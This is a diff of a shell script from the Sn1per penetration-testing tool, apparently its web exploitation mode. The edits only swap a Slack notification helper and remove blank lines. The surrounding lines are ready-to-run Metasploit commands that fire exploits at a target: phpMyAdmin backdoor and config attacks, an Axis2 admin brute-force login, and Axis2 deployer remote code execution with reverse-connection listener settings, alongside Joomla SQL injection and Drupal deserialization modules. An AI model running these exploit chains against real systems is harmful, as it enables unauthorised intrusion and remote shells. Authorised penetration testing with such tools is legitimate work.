@@ -1,5 +1,5 @@
       if [ "$SLACK_NOTIFICATIONS" == "1" ]; then
-            /usr/bin/python "$INSTALL_DIR/bin/slack.py" "[xerosecurity.com] •?((¯°·._.• Started Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
+            /bin/bash "$INSTALL_DIR/bin/slack.sh" "[xerosecurity.com] •?((¯°·._.• Started Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
       fi
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
@@ -103,40 +103,18 @@
       msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/htp/phpmyadmin_preg_replace; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw 2> /dev/null
-
-
-
-
-
-
-
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING AXIS2 ADMIN BRUTE FORCE SCANNER $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
       msfconsole -q -x "use scanner/http/axis_login; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg RHOST "$TARGET"; setg USERNAME admin; setg PASS_FILE "$PASS_FILE"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-axis_login.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-axis_login.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-axis_login.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-axis_login.raw 2> /dev/null
-
-
-
-
-
-
-
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING AXIS2 AUTHENTICATED DEPLOYER RCE $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
       msfconsole -q -x "use multi/http/axis2_deployer; setg RHOSTS "$TARGET"; set FingerprintCheck false; setg RPORT "$PORT"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-axis2_deployer.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-axis2_deployer.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-axis2_deployer.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-axis2_deployer.raw 2> /dev/null
-
-
-
-
-
-
-
-
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT CVE-2017-8917 $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -216,6 +194,6 @@
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.raw 2> /dev/null
       if [ "$SLACK_NOTIFICATIONS" == "1" ]; then
-            /usr/bin/python "$INSTALL_DIR/bin/slack.py" "[xerosecurity.com] •?((¯°·._.• Finished Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
+            /bin/bash "$INSTALL_DIR/bin/slack.sh" "[xerosecurity.com] •?((¯°·._.• Finished Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
       fi
       
